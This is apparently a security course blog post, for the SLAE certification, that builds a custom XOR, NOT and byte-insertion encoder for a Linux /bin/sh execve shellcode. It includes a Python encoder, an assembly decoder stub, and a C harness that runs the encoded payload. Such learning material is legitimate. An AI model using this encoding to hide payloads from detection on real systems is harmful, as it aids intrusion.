@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.0" /><meta property="og:title" content="SLAE - Assignment 4 - Custom Insertion Encoder" /><meta name="author" content="fwinsnes" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://whitecr0wz.github.io/posts/SLAE-Custom-Encoder/" /><meta property="og:url" content="https://whitecr0wz.github.io/posts/SLAE-Custom-Encoder/" /><meta property="og:site_name" content="Knowledge Library" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-17T05:44:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SLAE - Assignment 4 - Custom Insertion Encoder" /><meta name="twitter:site" content="@whitecr0wz" /><meta name="twitter:creator" content="@fwinsnes" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"fwinsnes"},"dateModified":"2021-01-17T05:44:00+00:00","datePublished":"2021-01-17T05:44:00+00:00","description":"Introduction","headline":"SLAE - Assignment 4 - Custom Insertion Encoder","mainEntityOfPage":{"@type":"WebPage","@id":"https://whitecr0wz.github.io/posts/SLAE-Custom-Encoder/"},"url":"https://whitecr0wz.github.io/posts/SLAE-Custom-Encoder/"}</script><title>SLAE - Assignment 4 - Custom Insertion Encoder | Knowledge Library</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Knowledge Library"><meta name="application-name" content="Knowledge Library"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://whitecr0wz.github.io/assets/img/Felipe-Winsnes.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Knowledge Library</a></div><div class="site-subtitle font-italic">Just sharing interesting tech stuff :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/whitecr0wz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SLAE - Assignment 4 - Custom Insertion Encoder</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SLAE - Assignment 4 - Custom Insertion Encoder</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1610862240" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 17, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Felipe Winsnes </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1271 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h4 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close look at a Custom Encoder.</p><p>The fourth assignment from the seven requires the creation of a Custom Encoder, similar to the one shown in the course as the “Insertion Encoder”. This should be written in the Assembly language, and converting such into <a href="https://es.wikipedia.org/wiki/Shellcode">shellcode</a>. Moreover, it is required that such is tested later on the C format.</p><h5 id="the-encoder"><span class="mr-2">The Encoder</span><a href="#the-encoder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>As for the encoder itself, I have chosen to concanate the three main techniques regarding encoding during the course, therefore, the encoder obeys the following procedure:</p><ul><li>XORs every opcode of the shellcode by 46.<li>Performs a NOT operation on every opcode of the shellcode.<li>Inserts an additional 0x45 byte for every opcode.</ul><p>Having the knowledge of such course of action allows us to understand that the decoder should follow the exact same process but on reverse:</p><ul><li>Remove the an additional 0x45 byte for every opcode and restore the encoded shellcode.<li>Perform a NOT operation on every opcode of the shellcode.<li>XOR every opcode of the shellcode by 46.</ul><h4 id="the-encoder-1"><span class="mr-2">The encoder</span><a href="#the-encoder-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-term">#!/usr/bin/python
+
+shellcode = (
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80"
+)
+
+encoded = ""
+encoded2 = ""
+
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode) :
+
+                                y = ~x^0x46
+
+                                encoded += '\\x'
+                                encoded += '%02x' % (y &amp; 0xFF)
+                                encoded += '\\x%02x' % 0x45
+
+                                encoded2 += '0x'
+                                encoded2 += '%02x,' % (y &amp; 0xFF)
+                                encoded2 += '0x%02x,' % 0x45
+
+
+print '"' + encoded + '"'
+
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
+</code></pre><p>Let’s encode the shellcode:</p><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ python custom_encoder.py 
+Encoded shellcode ...
+"\x88\x45\x79\x45\xe9\x45\xd1\x45\x96\x45\x96\x45\xca\x45\xd1\x45\xd1\x45\x96\x45\xdb\x45\xd0\x45\xd7\x45\x30\x45\x5a\x45\xe9\x45\x30\x45\x5b\x45\x09\x45\xb2\x45\x74\x45\x39\x45
+"
+0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x
+45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45,
+Len: 22
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$
+</code></pre><p>Good, let’s create the skeleton code:</p><pre><code class="language-term">global _start
+
+section .text
+
+_start:
+
+      jmp short master               ; Jumps to master
+
+main:
+
+      pop ebp                        ; Pops the value of the shellcode into ebp
+      mov esi, ebp                   ; Copies the value from ebp to esi
+
+master:
+
+      call main                      ; Calls to main and pops shellcode into the stack
+
+      shellcode: db 0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45
+</code></pre><p>Right now, the flow jumps to the master section and calls main, pushing the value of shellcode into the stack and popping into EBP. Furthermore, this value is copied into ESI, this will be essential when it comes to the following sections of XORing and NOT decoding the instructions, as the ESI value will have to be zeroed, therefore, EBP being a backup register.</p><p>Now, the following steps are the same as when it comes to any insertion decoder:</p><ul><li>Point EDI to the additional bytes.<li>Start a counter for the loop. (44 bytes in our case)<li>Point BL to the additional bytes.<li>XOR BL by the additional bytes.<li>Point BL to the following byte, which should be the intended.<li>Copy the value of BL into EDI, slowly restoring the original order.<li>Increment EDI in order to repeat the process.<li>AL is incremented by 2, once again to repeat the process.<li>Start the loop.</ul><pre><code class="language-term">      lea edi, [esi + 1]             ; Points to the 0x45 byte
+
+      xor eax, eax                   ; Zeroes out EAX
+      xor ebx, ebx                   ; Zeroes out EBX
+
+      mov cl, 44                     ; Stores counter (44 bytes)
+      mov al, 1                      ; Makes AL hold value 1 for later calculations.
+      
+decode:
+
+      mov bl, byte [esi + eax]       ; Points to 0x45
+      xor bl, 0x45                   ; Turns 0x45 into 0x00
+      mov bl, byte [esi + eax + 1]   ; Grabs intended value
+      mov byte [edi], bl             ; Replaces 0x00 for the intended value
+      inc edi                        ; Increments EDI, holding next 0x45 for replacement
+      add al, 2                      ; Adds 2 in order to continue the process
+      loop decode                    ; Starts loop
+</code></pre><p>Great! By now our shellcode should have the additional 0x45 bytes removed, the following step is to clean ESI and restore its value by copying the EBP register’s one! Furthermore, it is left for use to set the counter once again! This time to the half of the shellcode, as the additional bytes have been removed.</p><pre><code class="language-term">      mov cl, 22                     ; Stores counter (22 bytes)
+      xor esi, esi                   ; Zeroes out ESI
+      mov esi, ebp                   ; Copies the value from ebp to esi
+</code></pre><p>The next step should be executing the NOT operation. And once again, clean the value of ESI and restore its value!</p><p>The procedure of the NOT operation should be the pollowing:</p><ul><li>Perform a NOT operation on the value of ESI.<li>Increment ESI, pointing to the next byte.<li>Continue the loop.</ul><pre><code class="language-term">decode2:
+
+      not byte [esi]                 ; Performs a NOT operation on the value pointed by ESI
+      inc esi                        ; Increments ESI, therefore performing a NOT operation on every opcode
+      loop decode2                   ; Starts loop
+
+      mov cl, 22                     ; Stores counter (22 bytes)
+      xor esi, esi                   ; Zeroes out ESI
+      mov esi, ebp                   ; Copies the value from ebp to esi
+</code></pre><p>Finally, at last we have to XOR the remaining part of the shellcode by 0x46.</p><p>The procedure of the XOR operation should be the pollowing:</p><ul><li>Perform a XOR operation with 0x46 on the value of ESI.<li>Increment ESI, pointing to the next byte.<li>Continue the loop.<li>Once this is finished, jump to the fully decoded shellcode.</ul><pre><code class="language-term">decode3:
+
+      xor byte [esi], 0x46           ; Performs a XOR operation between the value of ESI and 0x46
+      inc esi                        ; Increments ESI, therefore performing aXOR operation on every opcode
+      loop decode3                   ; Starts loop
+      jmp short shellcode            ; Jumps to the shellcode
+
+</code></pre><p>Let’s test this encoder within the C format:</p><pre><code class="language-term">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned char code[] = \
+"\xeb\x38\x5d\x89\xee\x8d\x7e\x01\x31\xc0\x31\xdb\xb1\x2c\xb0\x01\x8a\x1c\x06\x80\xf3\x45\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xe2\xef\xb1\x16\x31\xf6\x89\xee\xf6\x16\x46\xe2\xfb
+\xb1\x16\x31\xf6\x89\xee\x80\x36\x46\x46\xe2\xfa\xeb\x05\xe8\xc3\xff\xff\xff\x88\x45\x79\x45\xe9\x45\xd1\x45\x96\x45\x96\x45\xca\x45\xd1\x45\xd1\x45\x96\x45\xdb\x45\xd0\x45\xd7\
+x45\x30\x45\x5a\x45\xe9\x45\x30\x45\x5b\x45\x09\x45\xb2\x45\x74\x45\x39\x45";
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+</code></pre><h4 id="endgame"><span class="mr-2">EndGame</span><a href="#endgame" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ gcc custom_insertion.c -o custom_insertion -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ ./custom_insertion 
+Shellcode Length:  107
+$
+</code></pre><p>Complete code:</p><pre><code class="language-term">global _start
+
+section .text
+
+_start:
+
+      jmp short master               ; Jumps to master
+
+main:
+
+      pop ebp                        ; Pops the value of the shellcode into ebp
+      mov esi, ebp                   ; Copies the value from ebp to esi
+
+      lea edi, [esi + 1]             ; Points to the 0x45 byte
+
+      xor eax, eax                   ; Zeroes out EAX
+      xor ebx, ebx                   ; Zeroes out EBX
+
+      mov cl, 44                     ; Stores counter (44 bytes)
+      mov al, 1                      ; Makes AL hold value 1 for later calculations.
+
+decode:
+
+      mov bl, byte [esi + eax]       ; Points to 0x45
+      xor bl, 0x45                   ; Turns 0x45 into 0x00
+      mov bl, byte [esi + eax + 1]   ; Grabs intended value
+      mov byte [edi], bl             ; Replaces 0x00 for the intended value
+      inc edi                        ; Increments EDI, holding next 0xAA for replacement
+      add al, 2                      ; Adds 2 in order to continue the process
+      loop decode                    ; Starts loop
+
+      mov cl, 22                     ; Stores counter (22 bytes)
+      xor esi, esi                   ; Zeroes out ESI
+      mov esi, ebp                   ; Copies the value from ebp to esi
+
+decode2:
+
+      not byte [esi]                 ; Performs a NOT operation on the value pointed by ESI
+      inc esi                        ; Increments ESI, therefore performing a NOT operation on every opcode
+      loop decode2                   ; Starts loop
+
+      mov cl, 22                     ; Stores counter (22 bytes)
+      xor esi, esi                   ; Zeroes out ESI
+      mov esi, ebp                   ; Copies the value from ebp to esi
+
+decode3:
+
+      xor byte [esi], 0x46           ; Performs a XOR operation between the value of ESI and 0x46
+      inc esi                        ; Increments ESI, therefore performing aXOR operation on every opcode
+      loop decode3                   ; Starts loop
+      jmp short shellcode            ; Jumps to the shellcode
+
+master:
+
+      call main                      ; Calls to main and pops shellcode into the stack
+
+      shellcode: db 0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45
+</code></pre><h3 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online- courses/securitytube-linux-assembly-expert/</a></p><p>Student ID: SLAE-27812/PA-27812</p><p>You can find all of the used resources within this post <a href="https://github.com/whitecr0wz/SLAE/tree/main/Assignment_4">here</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae/'>SLAE</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SLAE+-+Assignment+4+-+Custom+Insertion+Encoder+-+Knowledge+Library&url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Custom-Encoder%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE+-+Assignment+4+-+Custom+Insertion+Encoder+-+Knowledge+Library&u=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Custom-Encoder%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Custom-Encoder%2F&text=SLAE+-+Assignment+4+-+Custom+Insertion+Encoder+-+Knowledge+Library" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/VyOS-OSPF-I/">VyOS - OSPF Basic Network</a><li><a href="/posts/Alignments-on-windows-registers/">Alignments on Windows Registers</a><li><a href="/posts/Vulnserver-LTER/">Vulnserver LTER - SEH Extremely restricted character set</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SLAE64-Egghunter/"><div class="card-body"> <em class="small" data-ts="1611467040" data-df="ll" > Jan 24, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 3 - Egghunter</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a clo...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Encoder/"><div class="card-body"> <em class="small" data-ts="1611553440" data-df="ll" > Jan 25, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 4 - Custom Insertion Encoder</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look ...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Analyzing-Shellcode/"><div class="card-body"> <em class="small" data-ts="1611639840" data-df="ll" > Jan 26, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode</h3><div class="text-muted small"><p> These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. The fifth assignment from the seven requires ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SLAE-Egghunter/" class="btn btn-outline-primary" prompt="Older"><p>SLAE - Assignment 3 - Egghunter</p></a> <a href="/posts/SLAE-Analyzing-Shellcode/" class="btn btn-outline-primary" prompt="Newer"><p>SLAE - Assignment 5 - Analyzing 3rd party Shellcode</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/whitecr0wz">Felipe Winsnes</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
